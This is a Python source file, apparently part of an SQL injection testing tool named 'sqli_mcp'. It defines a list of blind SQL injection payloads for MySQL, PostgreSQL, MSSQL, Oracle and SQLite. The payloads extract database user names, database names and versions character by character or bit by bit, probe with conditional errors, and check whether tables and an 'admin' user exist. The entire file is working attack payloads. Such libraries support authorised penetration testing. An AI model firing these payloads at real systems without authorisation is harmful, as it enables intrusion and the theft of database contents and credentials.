"""Blind SQL injection payloads (content-based blind variations)."""

from sqli_mcp.models import Payload, InjectionType, DatabaseType

BLIND_PAYLOADS: list[Payload] = [
    # Blind enumeration - character extraction
    Payload(
        value="' AND ASCII(SUBSTRING((SELECT user()),1,1))>64-- -",
        injection_type=InjectionType.BLIND,
        database_type=DatabaseType.MYSQL,
        description="MySQL blind char extraction > 64"
    ),
    Payload(
        value="' AND ASCII(SUBSTRING((SELECT user()),1,1))>96-- -",
        injection_type=InjectionType.BLIND,
        database_type=DatabaseType.MYSQL,
        description="MySQL blind char extraction > 96"
    ),
    Payload(
        value="' AND ASCII(SUBSTRING((SELECT user()),1,1))=114-- -",
        injection_type=InjectionType.BLIND,
        database_type=DatabaseType.MYSQL,
        description="MySQL blind char extraction = 'r'"
    ),
    Payload(
        value="' AND (SELECT LENGTH(database()))>5-- -",
        injection_type=InjectionType.BLIND,
        database_type=DatabaseType.MYSQL,
        description="MySQL database name length check"
    ),
    
    # PostgreSQL blind
    Payload(
        value="' AND ASCII(SUBSTRING((SELECT current_user),1,1))>64-- -",
        injection_type=InjectionType.BLIND,
        database_type=DatabaseType.POSTGRESQL,
        description="PostgreSQL blind char extraction"
    ),
    Payload(
        value="' AND LENGTH((SELECT current_database()))>5-- -",
        injection_type=InjectionType.BLIND,
        database_type=DatabaseType.POSTGRESQL,
        description="PostgreSQL database name length"
    ),
    
    # MSSQL blind
    Payload(
        value="' AND ASCII(SUBSTRING((SELECT SYSTEM_USER),1,1))>64-- -",
        injection_type=InjectionType.BLIND,
        database_type=DatabaseType.MSSQL,
        description="MSSQL blind char extraction"
    ),
    Payload(
        value="' AND LEN(SYSTEM_USER)>5-- -",
        injection_type=InjectionType.BLIND,
        database_type=DatabaseType.MSSQL,
        description="MSSQL user name length check"
    ),
    
    # Oracle blind
    Payload(
        value="' AND ASCII(SUBSTR((SELECT user FROM dual),1,1))>64-- -",
        injection_type=InjectionType.BLIND,
        database_type=DatabaseType.ORACLE,
        description="Oracle blind char extraction"
    ),
    Payload(
        value="' AND (SELECT LENGTH(user) FROM dual)>5-- -",
        injection_type=InjectionType.BLIND,
        database_type=DatabaseType.ORACLE,
        description="Oracle user name length"
    ),
    
    # SQLite blind
    Payload(
        value="' AND UNICODE(SUBSTR((SELECT sqlite_version()),1,1))>50-- -",
        injection_type=InjectionType.BLIND,
        database_type=DatabaseType.SQLITE,
        description="SQLite blind version extraction"
    ),
    
    # Conditional error-based blind
    Payload(
        value="' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)=1-- -",
        injection_type=InjectionType.BLIND,
        database_type=DatabaseType.GENERIC,
        description="Conditional error (true case)"
    ),
    Payload(
        value="' AND (SELECT CASE WHEN (1=2) THEN 1 ELSE 1/0 END)=1-- -",
        injection_type=InjectionType.BLIND,
        database_type=DatabaseType.GENERIC,
        description="Conditional error (false case - should error)"
    ),
    
    # Existence checks
    Payload(
        value="' AND EXISTS(SELECT * FROM information_schema.tables)-- -",
        injection_type=InjectionType.BLIND,
        database_type=DatabaseType.MYSQL,
        description="MySQL table existence check"
    ),
    Payload(
        value="' AND EXISTS(SELECT * FROM users WHERE username='admin')-- -",
        injection_type=InjectionType.BLIND,
        database_type=DatabaseType.GENERIC,
        description="User existence check"
    ),
    Payload(
        value="' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -",
        injection_type=InjectionType.BLIND,
        database_type=DatabaseType.MYSQL,
        description="MySQL table count blind check"
    ),
    
    # Bit-by-bit extraction
    Payload(
        value="' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1)&1=1-- -",
        injection_type=InjectionType.BLIND,
        database_type=DatabaseType.MYSQL,
        description="Bitwise AND extraction bit 0"
    ),
    Payload(
        value="' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1)&2=2-- -",
        injection_type=InjectionType.BLIND,
        database_type=DatabaseType.MYSQL,
        description="Bitwise AND extraction bit 1"
    ),
]
